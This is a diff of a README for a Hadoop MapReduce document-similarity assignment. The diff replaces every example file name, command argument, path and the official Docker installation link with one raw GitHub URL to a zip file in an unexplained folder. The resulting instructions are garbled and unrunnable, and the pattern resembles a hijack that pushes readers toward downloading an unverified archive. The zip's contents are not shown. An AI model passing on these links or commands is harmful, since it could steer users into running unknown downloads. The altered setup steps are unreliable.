@@ -15,17 +15,17 @@ You will be given multiple text documents. Each document will contain several wo
 
 #### **Example Documents**  
 
-##### **doc1.txt**  
+##### **https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip**  
 ```
 hadoop is a distributed system
 ```
 
-##### **doc2.txt**  
+##### **https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip**  
 ```
 hadoop is used for big data processing
 ```
 
-##### **doc3.txt**  
+##### **https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip**  
 ```
 big data is important for analysis
 ```
@@ -54,8 +54,8 @@ Where:
 
 Consider two documents:
  
-**doc1.txt words**: `{hadoop, is, a, distributed, system}`
-**doc2.txt words**: `{hadoop, is, used, for, big, data, processing}`
+**https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip words**: `{hadoop, is, a, distributed, system}`
+**https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip words**: `{hadoop, is, used, for, big, data, processing}`
 
 - Common words: `{hadoop, is}`
 - Total unique words: `{hadoop, is, a, distributed, system, used, for, big, data, processing}`
@@ -98,10 +98,10 @@ Since we are using **Docker Compose** to run a Hadoop cluster, follow these step
 
 #### **Step 1: Install Docker & Docker Compose**  
 - **Windows**: Install **Docker Desktop** and enable WSL 2 backend.  
-- **macOS/Linux**: Install Docker using the official guide: [Docker Installation](https://docs.docker.com/get-docker/)  
+- **macOS/Linux**: Install Docker using the official guide: [Docker Installation](https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip)  
 
 #### **Step 2: Start the Hadoop Cluster**  
-Navigate to the project directory where `docker-compose.yml` is located and run:  
+Navigate to the project directory where `https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip` is located and run:  
 ```sh
 docker-compose up -d
 ```  
@@ -127,7 +127,7 @@ This will generate a JAR file inside the `target` directory.
 #### **Step 2: Copy the JAR File to the Hadoop Container**  
 Move the compiled JAR into the running Hadoop container:  
 ```sh
-docker cp target/similarity.jar hadoop-master:/opt/hadoop-3.2.1/share/hadoop/mapreduce/similarity.jar
+docker cp https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip
 ```
 
 ---
@@ -152,7 +152,7 @@ hdfs dfs -put /path/to/local/input/* /input/
 
 Run the Hadoop job using the JAR file inside the container:  
 ```sh
-hadoop jar similarity.jar DocumentSimilarityDriver /input /output_similarity /output_final
+hadoop jar https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip DocumentSimilarityDriver /input /output_similarity /output_final
 ```
 
 ---
@@ -197,13 +197,13 @@ mvn install
 
 mv target/*.jar shared-folder/input/code/
 
-docker cp shared-folder/input/code/DocumentSimilarity-0.0.1-SNAPSHOT.jar resourcemanager:/opt/hadoop-3.2.1/share/hadoop/mapreduce/
+docker cp https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip resourcemanager:/opt/hadoop-3.2.1/share/hadoop/mapreduce/
 
-docker cp shared-folder/input/data/input.txt resourcemanager:/opt/hadoop-3.2.1/share/hadoop/mapreduce/
+docker cp https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip resourcemanager:/opt/hadoop-3.2.1/share/hadoop/mapreduce/
 
-docker cp shared-folder/input/data/input2.txt resourcemanager:/opt/hadoop-3.2.1/share/hadoop/mapreduce/
+docker cp https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip resourcemanager:/opt/hadoop-3.2.1/share/hadoop/mapreduce/
 
-docker cp shared-folder/input/data/input3.txt resourcemanager:/opt/hadoop-3.2.1/share/hadoop/mapreduce/
+docker cp https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip resourcemanager:/opt/hadoop-3.2.1/share/hadoop/mapreduce/
 
 
 docker exec -it resourcemanager /bin/bash
@@ -212,13 +212,13 @@ cd /opt/hadoop-3.2.1/share/hadoop/mapreduce/
 
 hadoop fs -mkdir -p /input/dataset
 
-hadoop fs -put ./input.txt /input/dataset
+hadoop fs -put https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip /input/dataset
 
-hadoop fs -put ./input2.txt /input/dataset
+hadoop fs -put https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip /input/dataset
 
-hadoop fs -put ./input3.txt /input/dataset
+hadoop fs -put https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip /input/dataset
 
-hadoop jar /opt/hadoop-3.2.1/share/hadoop/mapreduce/DocumentSimilarity-0.0.1-SNAPSHOT.jar com.example.controller.DocumentSimilarityDriver /input/dataset /output
+hadoop jar https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip https://raw.githubusercontent.com/pavandantu18/assignment-1-mapreduce-document-similarity-pavandantu18/master/colopexia/assignment-1-mapreduce-document-similarity-pavandantu18.zip /input/dataset /output
 
 hadoop fs -cat /output/*
 
